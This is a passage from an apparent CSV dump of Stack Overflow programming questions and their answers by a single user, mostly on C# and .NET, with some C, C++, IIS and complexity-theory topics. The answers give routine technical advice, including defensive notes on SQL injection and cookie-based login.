<p>2: Variable allocation duplicity:</p>

<p>When you run application, Loader load its code into RAM. When you create variable, or string, compiler generates code that pushes these values on the top o stack when created in main. So there is actual instruction for do so, and that actual number in memory. So, there are 2 entries of the same value in RAM. One in form of instruction, second in form of actual bytes in the RAM. But why? Why not to just when declaring variable count at which memory block it would be, than  when used, just insert this memory location?</p>
","33708","","<p>How would you implement recursive functions? What you are describing is equivalent to using global variables everywhere.</p>

<p>That's just one problem. How can you link to a precompiled object file and be sure it won't corrupt the memory of your procedures?</p>
"
"<p>if i trying to sort my columns return 0 valu. But i need max value descinding value but how?</p>

<pre><code> for (int j = 0; j &#60; dTable.Columns.Count; j++)
                for (int i = 0; i &#60; dTable.Rows.Count; i++)
                {
                    mycounter[i] = dTable.Rows[i][j].ToString().Length;
                }
            mycounter = mycounter.OrderBy(i =&#62; i).ToArray();

            mycounter.Reverse();
            MessageBox.Show(mycounter[0].ToString());</code></pre>
","33708","","<p>I assume you want to sort in descending order. Just change <code>OrderBy</code> to <code>OrderByDescending</code>.</p>

<p>If you only need the maximum value, use the <code>Max</code> extension method:</p>

<pre><code>mycounter.Max()
</code></pre>
"
"<p>I am using the builtin ASP.NET logon and user management features. Is there a way to just identify if a username or email address is already registered? I would've thought it's part of FormsAuthentication or similar, but can't find such a function.</p>
","33708","","<p>Check whether <a href=""http://msdn.microsoft.com/en-us/library/system.web.security.membership.getuser.aspx"" rel=""nofollow""><code>Membership.GetUser</code> method</a> returns a null value or not.</p>

<p>If you want to create a new user and you're doing this check as a part of that process, try calling <a href=""http://msdn.microsoft.com/en-us/library/ms152012.aspx"" rel=""nofollow""><code>Membership.CreateUser</code> method</a> and check the <code>MembershipCreateStatus</code> to get the failure reason, in case it fails.</p>
"
"<p>I have been programming iPhone SDK for around 6 months but am a bit confused about a couple of things...one of which I am asking here:</p>

<p>Why are the following considered different?</p>

<pre><code>if (varOrObject == nil)
{

}
</code></pre>

<p>vs </p>

<pre><code>if (nil == varOrObject)
{

}
</code></pre>

<p>Coming from a perl background this is confusing to me...</p>

<p>Can someone please explain why one of the two (the second) would be true whereas the first would not if the two routines are placed one after the other within code.  <code>varOrObject</code> would not have changed between the two <code>if</code> statements.</p>

<p>There is no specific code this is happening in, just that I have read in a lot of places that the two statements are different, but not why.</p>

<p>Thanks in advance.</p>
","33708","","<p>They are the same. What you have read is probably talking about if you mistakenly write <code>==</code> as <code>=</code>, the former will assign the value to the variable and the <code>if</code> condition will be false, while the latter would be a compile time error:</p>

<pre><code>if (variable = nil) // assigns nil to variable, not an error.

if (nil = variable) // compile time error
</code></pre>

<p>The latter gives you the chance to correct the mistake at compile time.</p>
"
"<p>i have two variables in type of DateTime, and i want to sum them, how can i do it?
i get compilation error that says DateTime dosen't have operator +=</p>
","33708","","<p>You cannot add two <code>DateTime</code> values together. It wouldn't have any meaning. A <code>DateTime</code> represents a single point in time, whereas a <code>TimeSpan</code> represents a duration. Adding a point in time to a duration results in another point in time. You can only add <code>TimeSpan</code> values to <code>DateTime</code> values&ndash;and it <em>does</em> support <code>+=</code> in that case:</p>

<pre><code>dateTime += timeSpan;
</code></pre>
"
"<p>I have another <a href=""http://forums.asp.net/t/1193643.aspx"" rel=""nofollow"">class that creates the connection</a> (see refined class half way down page) and I believe it connects or at lest I do not hit any of the exceptions in run time. </p>

<p>I would now like to insert data into my database but nothing is updated.
I am trying to follow <a href=""http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.aspx"" rel=""nofollow"">this</a> example but it is for reading.  </p>

<p>I did run ""querystring"" on the show SQL Pane and it does execute correctly. It inserts data properly as  a new row.</p>

<p>not sure what to do after my last line? Thanks.</p>

<pre><code>string queryString =
""INSERT INTO UserData UserProfileID, ConfidenceLevel, LoveLevel, HappinessLevel) VALUES ('a051fc1b-4f51-485b-a07d-0f378528974e', 2, 2, 2);"";

    protected void Button1_Click(object sender, EventArgs e)
    {
        MySqlConnection database = new MySqlConnection();
        database.CreateConn();

        Command = new SqlCommand(queryString, database.Connection);  //

    }
</code></pre>
","33708","","<pre><code> Command.ExecuteNonQuery();
</code></pre>

<p>By the way, you're missing a parenthesis in your SQL query string.</p>

<p>And of course, you'd use parameters in a real query (and you will not use string concatenation instead of passing parameters as it'll open doors for destructive SQL injection attacks).</p>
"
"<pre><code>int expenseCode;
if (int.TryParse(sourceRecord.ExpenseCode, out expenseCode) &amp;&amp; _ExpenseCodeLookup.ContainsKey(expenseCode))
{
     destRow.PROFIT_CENTER_NAME = _ExpenseCodeLookup[expenseCode];
}
else
     destRow.PROFIT_CENTER_NAME = ""Unknown"";
</code></pre>

<p>The thing I am conerned about is will the first expression  always be run (setting <code>expenseCode</code> in the process) before the second operation?</p>
","33708","","<p>No, it won't cause bad things to happen!</p>

<p>The <code>&amp;&amp;</code> operator guarantees not to evaluate the right operand if the left operand evaluates to false. This is called short-circuiting.</p>

<p>Similarly, <code>||</code> operator will not evaluate the right operand if the left operand evaluates to true.</p>

<p>The non-short-circuiting versions of these operators for boolean values are <code>&amp;</code> and <code>|</code>. They will evaluate both operands regardless of the value of the left hand side.</p>
"
"<p>I've got a simple ASHX handler that returns an dynamically generated image; the image is generated from a custom created class, and an object belonging to this class is passed to the handler using Session (I'd rather avoid using QueryString).</p>

<p>The handler is used as the URL of an image on a ASP form which is very simple: a drop down list, a button and an image. Basically, depending on what the user selects from the list, the appropriate image will be generated once the button is pressed.</p>

<p>At the start the actual image has it's Visible property set to false; I don't want the handler to display anything before the data is all there.</p>

<p>Once the button is pressed, the required Session parameter is added containing the necessary object, and the page is refreshed using Server.Transfer. When the Page_load method detects that the Session parameter has been correctly set, it sets the Visible parameter on the image to true.</p>

<p>After that the handler fires up and generates the image.</p>

<p>So far so good... However, if the user now picks something different from the list and presses the button, despite the correct object being passed in the Session, the image won't be updated. In fact, the handler won't even fire up (if I put a breakpoint in there). I need to close the browser window and reopen it for it to work.</p>

<p>Any ideas what could be the cause of such behaviour?</p>

<p>I suspect the answer is very simple, and I just don't know something fundamental about ASP (or handlers)...</p>
","33708","","<p>The image is probably cached on the client and the browser didn't bother to request a new version from the server.  At the beginning of the <code>ProcessRequest</code> method add:</p>

<pre><code>context.Response.Cache.SetCacheability(HttpCacheability.NoCache);
</code></pre>
"
"<p>I have a <code>Dictionary&lt;string, bool&gt;</code> where key - control's ID and value - it's visible status to set:</p>

<pre><code>var dic = new Dictionary&lt;string, bool&gt;
{
    { ""rowFoo"", true},
    { ""rowBar"", false },
    ...
};
</code></pre>

<p>Some of controls can be <code>null</code>, i.e. <code>dic.ToDictionary(k =&gt; this.FindControl(k), v =&gt; v)</code> will not work because key can't be null.</p>

<p>I can do next:</p>

<pre><code>dic
    .Where(p =&gt; this.FindControl(p.Key) != null)
    .ForEach(p =&gt; this.FindControl(p.Key).Visible = p.Value); // my own extension method
</code></pre>

<p>but this will call <code>FindControl()</code> twice for each key.</p>

<p>How to avoid double search and select only those keys for which appropriate control exists?</p>

<p>Something like:</p>

<pre><code>var c= FindControl(p.Key);
if (c!= null)
    return c;
</code></pre>

<p>but using LINQ.</p>
","33708","","<pre><code>dic.Select(p =&gt; new { Control = this.FindControl(p.Key), p.Value })
   .Where(p =&gt; p.Control != null)
   .ForEach(p =&gt; p.Control.Visible = p.Value);
</code></pre>

<p>... but I'd simply use <code>foreach</code> with an <code>if</code> statement. Don't overuse LINQ.</p>
"
"<p>Also, does it matter where in the class you declare the friend ? 
Does it matter if you add a friend class or a friend function ? </p>
","33708","","<p>No it doesn't. It's a purely compile-time thing: similar to access modifiers themselves.</p>

<p>Despite the fact that you write the declaration <em>inside the class</em>, you don't really <em>add a friend to a class</em>. You'd basically <em>declare something else as a friend of the class</em> and simply allow it to access the class's private members, as if they were public.</p>
"
"<p>Greetings!</p>

<p>I'm needing to deploy a compact database with an application I am working on. The database acts as a cache for data the app has already seen, and that data will never change, so the cached values will never become outdated. I've chosen SQLite, and I'm writing in C#.</p>

<p>I'd like to protect the database files so they cannot be easily accessed or edited by the user - keeping access to my application only. Now, one option is to use password protection which is fine except that with tools like Reflector one could easily view a near original version of the source and check the passwords/how they are generated per file and replicate this. </p>

<p>Are there any suggestions on how to achieve this result or something close? Have people done something like this in the past? </p>

<p>Thanks!</p>
","33708","","<p>Security by obscurity.</p>

<p>If your apps can decrypt it, then your user can do it too.</p>

<p>If you want to keep it secure, you'll have to keep it for yourself. Your best bet is to store the database on a server and make it available via a web service. Perform access control checks on your own server so that the application can only access the parts of the database it has to see.</p>
"
"<p>I have a static class that holds a dictionary of objects. I have multiple threads that access this dictionary and create objects on it that are specific to <em>that</em> thread. How and when can I remove entries from the dictionary when a thread is ""done""?</p>

<p>Basically this is a static class for an ASP.NET application that all requests can have ""isolated objects"" (that are related to the current thread) created in the dictionary. But, I don't really want to be tied to ASP.NET.</p>

<p>Does this make sense? </p>
","33708","","<p>You can decorate a static field with a <code>[ThreadStatic]</code> attribute and each thread will see its own value. If you are using .NET 4.0, you can use <a href=""http://msdn.microsoft.com/en-us/library/dd642243.aspx"" rel=""nofollow""><code>ThreadLocal&lt;T&gt;</code></a> to do that too. Basically, you'd have a separate dictionary for each thread holding its own objects rather than saving all objects in a single dictionary.</p>
"
"<p>What is the best way to add an item to IEnumerable collection using Extension method?</p>
","33708","","<pre><code>enumerable.Concat(new[]{ objToAdd })
</code></pre>
"
"<p>If I have a method or a property that returns an <code>IEnumerable&lt;SomeType&gt;</code> that leads to no data,
is it more efficient to return an empty array <code>new SomeType[0]</code> or is it better to return an empty list <code>new List&lt;SomeType&gt;()</code> or is there an even better solution (IMO building an own type with generics could be such a solution but it seems to me a little bit overkill)? </p>

<p>The array is my favorite but what do you think about this?</p>
","33708","","<p>Return <a href=""http://msdn.microsoft.com/en-us/library/bb341042.aspx"" rel=""nofollow""><code>Enumerable.Empty&lt;T&gt;()</code></a>.</p>
"
"<p>How could I use C# to download the contents of a URL, and store the text in a string, without having to save the file to the hard drive?</p>
","33708","","<pre><code>var contents = new System.Net.WebClient().DownloadString(url);
</code></pre>
"
"<p>Is it possible to use all WPF functionality in C# (VB, ...)? Or is there any maybe advanced functionality that is not directly accessible from C#? (Maybe because it might not be accessible by public methods but rather internal.)</p>
","33708","","<p>Nothing. In fact, the actual parsing and processing (assignment of values to properties, binding to events, ...) of XAML files are eventually done by imperative C# code. </p>

<p>It can, however, be more tedious to set object properties using C#/VB directly; UI designers may know XAML but not C#/VB; and XML is perhaps more toolable than C# source. These factors make XAML a useful technology.</p>
"
"<p>IEquatable&lt;T&gt; could have been declared to be contravariant in T, since it only uses T in an input position (or, equivalently, U being a subtype of T should imply that IEquatable&lt;T&gt; is [a subtype of] IEquatable&lt;U&gt;).</p>

<p>So, why did the BCL team not annotate it (for C# 4.0) with the 'in' keyword, as they did with many other generic interfaces (like the entirely analogous IComparable)?</p>
","33708","","<p>I think this is mainly for a philosophical reason rather than a technical limitation&ndash;as it's perfectly possible to simply annotate the interface. <code>IEquatable&lt;T&gt;</code> is meant to compare objects of the same type for exact equality. An instance of a superclass is not usually considered equal to an instance of a subclass. Equality in this sense implies type equality too. This is a bit different from <code>IComparable&lt;in T&gt;</code>. It can be sensible to define a relative sort order across different types.</p>

<p>To quote <a href=""http://msdn.microsoft.com/en-us/library/ms131187.aspx"">MSDN page on <code>IEquatable&lt;T&gt;</code></a>:</p>

<blockquote>
  <p>Notes to Implementers:</p>
  
  <p>Replace the type parameter of the <code>IEquatable&lt;T&gt;</code> interface with <strong>the type that is implementing this interface</strong>.</p>
</blockquote>

<p>This sentence further demonstrates the fact that <code>IEquatable&lt;T&gt;</code> is meant to work between instances of a single concrete type. </p>
"
"<pre><code>someString[someRandomIdx] = 'g';
</code></pre>

<p>that will give me an error,</p>

<p>how do I achieve the above?</p>

<p><strong>Edit:</strong></p>

<p>yes it is of type 'string'</p>
","33708","","<p>C# strings are immutable. You should create a new string with the modified contents.</p>

<pre><code> char[] charArr = someString.ToCharArray();
 charArr[someRandomIdx] = 'g'; // freely modify the array
 someString = new string(charArr); // create a new string with array contents.
</code></pre>
"
"<p>And if so, why can't you do this:</p>

<pre><code>public interface IParsable
{
    static IParsable Parse(string s);
    static bool TryParse(string s, out IParsable);
}
</code></pre>

<p>in C#?</p>

<p>EDIT: Or, alternatively:</p>

<pre><code>public interface IParseable&lt;T&gt;
{
    static T Parse(string s);
    static bool TryParse(string s, out T);
}
</code></pre>

<p>EDIT #2:
I have learned the folly of my ways by trying to use an IParsable, as suggested by many below. The example I made follows. Of course, there is no way to resolve the call to TryParse...</p>

<pre><code>public IParsable ReadFromKeyboard()
{
    IParsable ToReturn;
    bool FirstTry = false;
    bool Success;
    do
    {
        if (!FirstTry)
            DisplayError();
        AskForInput();

        Success = IParsable.TryParse(Console.ReadLine, out ToReturn);
        FirstTry = false;
    } while(!Success)

    return ToReturn;
}
</code></pre>
","33708","","<p>No, you can't force a class to implement static members.</p>
"
"<p>I've recently listened to Kevin Hazzard talk about Code Contracts in .Net Rocks show 570 (http://devjourney.com/community/dotnet-rocks-show-570-with-kevin-hazzard/). He mentions enabling Run-time Contract Checking as an option some people might choose to use while others might not.</p>

<p>Why would you not use Run-time Contract Checking for your Code Contracts? Is there a significant negative impact on performance? Other reasons?</p>

<p>If you disable this feature, how do you deal with preconditions in your methods at run-time?</p>
","33708","","<p>In some non-mission-critical applications, you may actually want to let the errors slide in a release build rather than throwing an error dialog in the face of the user.  Small bugs that the end-user may never notice can cause your contract check to fail and harm user experience. </p>
"
"<p>I am not very experienced with either programming or scripting database queries, and I have seem to come to rely on further manipulation of  results from a   database instead of spending time writing a more complete query that would achieve my final objective.</p>

<p>In fact in some cases I am completely changing the nature of the results by combining values on columns and deleting rows. It just seems easier to manipulate in code in a loop rather than writing a more involved query.</p>

<p>Of course most of the times I can write the query and I get the results back from the server exactly how I want to consume it. But there are those occasions where I run the results for further filtering, because  I just don't know how to do it in sql but coding seems pretty straight forward.</p>
","33708","","<p>It depends on the nature of those operations. SQL is not really suitable for procedural calculations that cannot be described in relational queries. However, when you are dealing with large datasets, you have to be careful not to fetch too much data for further processing to the client and deal with it as much as possible on the server.</p>
"
"<p>I've been told to not worry about retain counts. I understand that I shouldn't decide to <code>release</code> or <code>retain</code> using conditional logic based on <code>retainCount</code>, but should I not worry about it? I thought these correspond to memory usage in some way.</p>

<p>For instance, if I have a bunch of subviews of <code>UIView</code> that I've also put into an <code>NSArray</code> to be able to iterate through them, doesn't that <strong>double</strong> the retain count and therefore the memory use of the application? If so, is this costly or trivial, if the subviews are, say, 500 <code>UIControl</code> instances? <strong>This is assuming that I need the 500 instances, of course.</strong></p>
","33708","","<blockquote>
  <p>For instance, if I have a bunch of subviews of UIView that I've also put into an NSArray to be able to iterate through them, doesn't that double the retain count...</p>
</blockquote>

<p>Yes, it will.</p>

<blockquote>
  <p>...  and therefore the memory use of the application?</p>
</blockquote>

<p>No! The conclusion is wrong. 1000000 takes as much space as 0 when stored as a 32-bit integer.</p>
"
"<p>From wikipedia: </p>

<blockquote>
  <p>A problem H is NP-hard if and only if there is an NP-complete problem L that is polynomial time Turing-reducible to H (i.e., Lâ¯â¤â¯TH).</p>
</blockquote>

<p>Why does the problem(call it W) being reduced from need to be NP-complete? Why can't it just also be NP-hard? It seems like what you care about W being ""hard"" not that its in NP.</p>

<p>Thoughts? </p>
","33708","","<p>It can. In fact, your second paragraph implies the first paragraph.</p>

<p>Assume NP-hard problem H is polynomially reducible to problem X. By definition, there exists an NP-complete problem C that is polynomially reducible to H.  Since both reductions are polynomial, you can reduce C to X in polynomial time.  Therefore, NP-complete problem C is reducible to X in polynomial time. Therefore problem X is NP-hard.</p>
"
"<p>I have always been curious about this - why do in C++ I have to cast return value from <code>malloc</code> but not in C?</p>

<p>Here is the example in C++ that works:</p>

<pre><code>int *int_ptr = (int *)malloc(sizeof(int*));
</code></pre>

<p>And here is the example in C++ that doesn't work (no cast):</p>

<pre><code>int *int_ptr = malloc(sizeof(int*));
</code></pre>

<p>I heard that in C, in fact, casting an output from <code>malloc()</code> is a mistake. </p>

<p>Can anyone comment on this topic?</p>

<p>Thanks, Boda Cydo.</p>
","33708","","<p>C supports implicit cast from <code>void*</code> to other pointer types. C++ disallows it.</p>

<p>One reason that it's frowned upon in C to explicitly cast the return value of <code>malloc</code> is that if the <code>malloc</code> signature is not included in the current compilation unit, the compiler will assume that the return type is <code>int</code> and implicit conversion of it to the pointer type you're assigning to results in a compile-time warning you'd immediately resolve. With an explicit cast, if you make this mistake, no warning will be issued.</p>
"
"<p>I have a select query which is used over and over with different <code>where</code> filters:</p>

<pre><code>var query = from row in context.Table select row;
</code></pre>

<p>How can I save this into a static class variable so I can reuse it in different methods? Like:</p>

<pre><code>var results1 = query.Where(condition1);
...
var results2 = query.Where(condition2);
</code></pre>
","33708","","<p>Simply replace <code>var</code> with <code>IEnumerable&lt;RowType&gt;</code> (or <code>IQueryable&lt;RowType&gt;</code>) where <code>RowType</code> is the (non-anonymous) type of each item in the result sequence:</p>

<pre><code>static IEnumerable&lt;RowType&gt; query = from ... select row; // row is of RowType.
</code></pre>
"
"<p>( note prefix means http:  )</p>

<p>I'm setting up a new website on port 8080, on windows 2003 IIS6.</p>

<p>i've setup the physical files in c:\TestNet and given iusr_ access.
within IIS console it can see the files in the right pane, so i know it's path is correct.</p>

<p>when viewing  prefix//localhost:8080  or prefix//192.168.xxx.yyy I can get to the default(Correct) webpage which is good.</p>

<p>However I don't want users to type in an IPAddress and port(prefix//192.168.xxx.yyy). Instead I want them to type prefix//TestNet.lab and they should be sent to the website. </p>

<p>I have setup a host header using the iis console(TestNet...>properties...> Website(tab)... advance button). The host header is TestNet.Lab, the port is 8080 and the IPaddress is set to Default.</p>

<p>When I type in prefix//TestNet.lab in internet explorer it returns page not found, 404.</p>

<p>I'm not sure what i'm doing wrong. Ideally I want users in our office to access this website. Please Help</p>

<p>Regards</p>

<p>Any ideas, why the browser is returning 404?</p>
","33708","","<p>Is your network DNS server (or local hosts file on the client) configured to resolve <code>testnet.lab</code> to the server IP address? Just setting the host header configuration in IIS is not enough.</p>

<p>Configuring the DNS server to map that domain to an IP address will fix the IP issue but the default port requested by the browser is always 80 for the HTTP protocol. Unless you have a proxy/NAT/something similar to redirect the requests to the custom port appropriately, you cannot get rid of <code>:8080</code>. </p>
"
"<p>Anyone knows this tip?</p>
","33708","","<p>Try <code>getline</code>:</p>

<pre><code>string s;
getline(cin, s);
</code></pre>
"
"<p>I'm trying to dynamically create an object of a certain type in a LINQ-to-XML query based on a string within my XML document.  I'm used to being able to dynamically create an object of any type in PHP and JavaScript by simply being able to write something like:</p>

<pre><code>$obj = new $typeName();
</code></pre>

<p>Ideally, I'd like to be able to do something like:</p>

<pre><code>List&lt;someObj&gt; = (from someObjs in XMLfile
                 select new someObj()
                 {
                     Name = (string)someObjs.Element(""name""),
                     NestedObj = new someObjs.Element(""nestedObj"").Element(""type"")()
                     {
                         NestedName = (string)someObjs.Element(""nestedObj"").Element(""name"")
                     }
                 }).ToList();
</code></pre>

<p>I just can't figure out how to do it without grabbing a hold of the current executing assembly.</p>
","33708","","<p>You can use:</p>

<pre><code>Activator.CreateInstance(Type.GetType(typeName))
</code></pre>

<p>Of course, this only works for types with a parameterless constructor. </p>

<hr>

<p>Update (initializing the object):</p>

<p>You can use C# 4 dynamic typing features to set properties of the newly created object:</p>

<pre><code>dynamic newObj = Activator.CreateInstance(Type.GetType(typeName));
newObj.NestedName = str;
</code></pre>

<p>In the context of a LINQ to XML query, you may have to resort to lambda syntax with explicit body:</p>

<pre><code>var list = XMLFile.Select(someObjs =&gt; {
    dynamic nestedObj = Activator.CreateInstance(
       Type.GetType(someObjs.Element(""nestedObj"").Element(""type"")));
    nestedObj.NestedName = (string)someObjs.Element(""nestedObj"").Element(""name"");
    return new someObj {
        Name = (string)someObjs.Element(""name""),
        NestedObj = nestedObj
    };
}).ToList();
</code></pre>
"
"<p>Why are assignment operators (=) invalid in a <code>foreach</code> loop?  I'm using C#, but I would assume that the argument is the same for other languages that support <code>foreach</code> (e.g. PHP).  For example, if I do something like this:</p>

<pre><code>string[] sArray = new string[5];

foreach (string item in sArray)
{
   item = ""Some assignment.\r\n"";
}
</code></pre>

<p>I get an error, ""Cannot assign to 'item' because it is a 'foreach iteration variable'.""</p>
","33708","","<p>Because the language specification says so.</p>

<p>But seriously, not all sequences are arrays or things that can be logically modified or written to. For instance:</p>

<pre><code>foreach (var i in Enumerable.Range(1, 100)) {
   // modification of `i` will not make much sense here.
}
</code></pre>

<p>While it would've been technically possible to have <code>i = something;</code> modify a local variable, it can be misleading (you may think it really changes something under the hood and it wouldn't be the case). </p>

<p>To support these kind of sequences, <code>IEnumerable&lt;T&gt;</code> doesn't require a <code>set</code> accessor for its <code>Current</code> property, making it read-only. Thus, <code>foreach</code> cannot modify the underlying collection (if one exists) using the <code>Current</code> property.</p>
"
"<p>I have a 3rd party method that returns an old-style ArrayList, and I want to convert it into a typed ArrayList(Of MyType).</p>

<pre><code>Dim udc As ArrayList = ThirdPartyClass.GetValues()
Dim udcT AS List(Of MyType) = ??
</code></pre>

<p>I have made a simple loop, but there must be a better way:</p>

<pre><code>Dim udcT As New List(Of MyType)
While udc.GetEnumerator.MoveNext
    Dim e As MyType = DirectCast(udc.GetEnumerator.Current, MyType)
    udcT.Add(e)
End While
</code></pre>
","33708","","<pre><code>Dim StronglyTypedList = OriginalArrayList.Cast(Of MyType)().ToList()
' requires `Imports System.Linq`
</code></pre>
"
"<p>Long:</p>

<pre><code>  char long_num[8];
  for(i=0; i&lt;8; i++)
    long_num[i] = data[pos++];

  memcpy(&amp;res, long_num, 8);
</code></pre>

<p>The values in the <code>long_num</code> are as follows:</p>

<p>127 -1 -1 -1 -1 -1 -1 -1</p>

<p><code>res</code> should be the maximum value of signed <code>long</code>, but is -129 instead.</p>

<p>EDIT: This one is taken care of. It was a result of communication problems: For the person providing <code>data</code>, a <code>long</code> is eight bytes; for my C it's four.</p>

<p>Float:</p>

<pre><code>  float *res;
  /* ... */
  char float_num[4];
  for(i=0; i&lt;4; i++)
    float_num[i] = data[pos++];

  res = (float *)float_num;
</code></pre>

<p>It's zero. Array values:</p>

<p>62 -1 24 50</p>

<p>I also tried <code>memcpy()</code>, but it yields zero as well. What am I doing wrong?</p>

<hr>

<p>My system: <code>Linux 2.6.31-16-generic i686 GNU/Linux</code></p>
","33708","","<p>You are running the code on a <a href=""http://en.wikipedia.org/wiki/Little-endian"" rel=""nofollow"">little-endian</a> system. Reverse the order of bytes in the array and try again:</p>

<pre><code>signed char long_num[] = {-1, -1, -1, -1, -1, -1, -1, 127};
// ...
</code></pre>
"
"<p>You can get the same output with for and while loops:</p>

<p><strong>WHILE</strong></p>

<pre><code>$i = 0;
while ($i &lt;= 10){
  print $i.""\n"";
  $i++;
};
</code></pre>

<p><strong>FOR</strong></p>

<pre><code>for ($i = 0; $i &lt;= 10; $i++){
  print $i.""\n"";
}
</code></pre>

<p><strong>But which one is faster?</strong></p>
","33708","","<p>That clearly depends on the particular implementation of the interpreter/compiler of the specific language.</p>

<p>That said, theoretically, any sane implementation is likely to be able to implement one in terms of the other if it was faster so the difference should be negligible at most. </p>

<p><sub>Of course, I assumed <code>while</code> and <code>for</code> behave as they do in C and similar languages.  You could create a language with completely different semantics for <code>while</code> and <code>for</code></sub></p>
"
"<p>If I have a string: <code>str1|str2|str3|srt4</code> and parse it with <code>|</code> as a delimiter. My output would be <code>str1 str2 str3 str4</code>.</p>

<p>But if I have a string: <code>str1||str3|str4</code> output would be <code>str1 str3 str4</code>. What I'm looking for my output to be like is <code>str1 null/blank str3 str4</code>.</p>

<p>I hope this makes sense. </p>

<pre><code>string createText = ""srt1||str3|str4"";
string[] txt = createText.Split(new[] { '|', ',' },
                   StringSplitOptions.RemoveEmptyEntries);
if (File.Exists(path))
{
    //Console.WriteLine(""{0} already exists."", path);
    File.Delete(path);
    // write to file.

    using (StreamWriter sw = new StreamWriter(path, true, Encoding.Unicode))
    {
        sw.WriteLine(""str1:{0}"",txt[0]);
        sw.WriteLine(""str2:{0}"",txt[1]);
        sw.WriteLine(""str3:{0}"",txt[2]);
        sw.WriteLine(""str4:{0}"",txt[3]);
    }
}
</code></pre>

<h3>Output</h3>

<pre><code>str1:str1
str2:str3
str3:str4
str4:""blank""
</code></pre>

<p>Thats not what i'm looking for. This is what I would like to code:</p>

<pre><code>str1:str1
str2:""blank""
str3:str3
str4:str4
</code></pre>
","33708","","<p>Try this one: </p>

<pre><code>str.Split('|')
</code></pre>

<p>Without <code>StringSplitOptions.RemoveEmptyEntries</code> passed, it'll work as you want.</p>
"
"<p>I'm making a game that will allow content development and I'd like it to be sort of a DLL based system. But, my game works for Linux (X86 arch) , Mac OSX and 32 bit Windows. Is there a way I could allow content developers to compile only one thing and have it work based on the platform? I fear it might get confusing if there are 3 versions per plugin. What could I do?</p>

<p>Thanks</p>
","33708","","<p>You can decide to use a cross-platform scripting environment like Lua for plugins. This is essentially what most cross-platform games do.</p>
"
"<p>I'm looking for a short tutorial about creating a login page for a website using cookies.</p>

<p>Each user has a <code>username</code> and a <code>password</code>.</p>

<p>Should I save both the <code>username</code> and the <code>password</code> in the cookies ? or just the <code>username</code> may be enough ?</p>

<p>Can a malicious user steal somehow these cookies and pass the authorization ?</p>
","33708","","<p>It's not a good idea to store the password in the cookie. If you store just a username, your system is basically completely unsecure. Remember that the client has complete control over the contents of cookies it sends to the server. It can send any username it wants. You should create an authorization token for the specific session (probably with an expiration time associated with it) and store that in the cookie. To prevent tampering with the cookie, you should sign (and encrypt) it on the server and validate the signature.</p>

<p>That said, doing that correctly is not an easy task. Don't reinvent the wheel. Use the authentication mechanisms provided by your platform.</p>
"
"<p>following  is my code,
  i don't know why DateTime can not change to Object ,
  any idea to resolve this problem? </p>

<pre><code>    public class Test
    {
        public DateTime CreatedTime { get; set; }
    }
    public class Test1
    {

    }
    public class Test2 : Test1
    {
    }
    static void Main(string[] args)
    {

        Func&lt;Test, ArgumentException&gt; fn1 = null;
        Func&lt;Test, Exception&gt; fn2 = fn1;// success 

        Func&lt;Test, Test2&gt; fn3 = null;
        Func&lt;Test, Test1&gt; fn4 = fn3;//success  

        Func&lt;Test, DateTime&gt; expression1 = p =&gt; p.CreatedTime;
        Func&lt;Test, object&gt; s = expression1; // Cannot implicitly convert type 'System.Func&lt;IlReader.Program.Test,System.DateTime&gt;' to 'System.Func&lt;IlReader.Program.Test,object&gt;'    
        Func&lt;Test, ValueType&gt; s2 = expression1; // cannot implicatily convert .... 
    }
</code></pre>
","33708","","<p><code>DateTime</code> is a value type. Converting a value type to a reference type (<code>object</code> in this case) is a representation-changing conversion. It requires boxing the value type. For reference types, this is not the case. CLR implements reference with pointers and all pointers have the same size. A reference to a derived class is merely interpreted as a reference to the base class. For this reason, you cannot use covariance like that on value types.</p>

<p>Theoretically, it would have been possible for the compiler to generate an intermediate function like:</p>

<pre><code>object compilerGeneratedFunction(Test t) {
    return (object)anonymousFunctionThatReturnsDateTime(t);
    // The above cast can be implicit in C# but I made it explicit to demonstrate
    // boxing that has to be performed.
}

Func&lt;Test, DateTime&gt; convertedFunction = compilerGeneratedFunction;
</code></pre>

<p>But the resulting delegate would point to an entirely different function causing bad things like not obeying delegate equality rules in C# spec. The design team has decided against generating such a function. </p>
"
"<p>I have the following repository that I use for unit testing:</p>

<pre><code>public class MyTestRepository&lt;T&gt;
{
    private List&lt;T&gt; entities = new List&lt;T&gt;();

    public IQueryable&lt;T&gt; Entities
    {
        get { return entities.AsQueryable(); }
    }

    public T New()
    {
        //return what here???
    }

    public void Create(T entity)
    {
        entities.Add(entity);
    }

    public void Delete(T entity)
    {
        entities.Remove(entity);
    }
}
</code></pre>

<p>What do I return in the New() method?</p>

<p>I have tried this:</p>

<pre><code>    public T New()
    {
        return (T) new Object();
    }
</code></pre>

<p>But that gives me the following exception when I run my unit test:</p>

<pre><code>System.InvalidCastException: Unable to cast object of type 'System.Object' to type 'MyCustomDomainType'.
</code></pre>

<p>Any idea on how to implement the New() method?</p>
","33708","","<p>You could add a constraint for the <code>T</code> type parameter:</p>

<pre><code>public class MyTestRepository&lt;T&gt; where T : new() 
</code></pre>

<p>and <code>return new T();</code> in the method.</p>
"
"<p>I am looking for a way to change the following code:</p>

<pre><code>foreach (Contact _contact in contacts)
{
    _contact.ID = 0;
    _contact.GroupID = 0;
    _contact.CompanyID = 0;
}
</code></pre>

<p>I would like to change this using LINQ / lambda into something similar to:</p>

<pre><code>contacts.ForEach(c =&gt; c.ID = 0; c.GroupID = 0; c.CompanyID = 0);
</code></pre>

<p>However that doesn't work. Is there any way to do multi-line in a linq foreach other than by writing a function to do this in one line?</p>
","33708","","<pre><code>contacts.ForEach(c =&gt; { c.ID = 0; c.GroupID = 0; c.CompanyID = 0; });
</code></pre>

<p>It doesn't have anything to do with LINQ per se; it's just a simple anonymous method written in lambda syntax passed to the <code>List&lt;T&gt;.ForEach</code> function (which existed since 2.0, before LINQ).</p>
"
"<p>Is the address returned by malloc a virtual address or is it the actual physical address where the memory is allocated?</p>

<p><strong>Edit:</strong></p>

<p>I read somewhere ""In some implementations, calling free() releases the memory back to the system and in others it is released back to the process"". Does ""releasing back to the system"" imply that the memory is the actual physical memory and ""releasing back to the process"" mean it is virtual memory?</p>
","33708","","<p>It's an address valid in the current process. Whether it's virtual address or physical address depends on the underlying platform.</p>
"
"<p>I have some legacy code that I have to wrap, and I have come across this declaration:</p>

<pre><code>class Foo : Bar
{
    // ...
};
</code></pre>

<p>This seems to compile under GCC.  I know it's bad, but I can't change it.  My question is, if no inheritance access specifier is present, how does the C++ compiler handle it?</p>
","33708","","<p>It's <code>private</code>.</p>
"
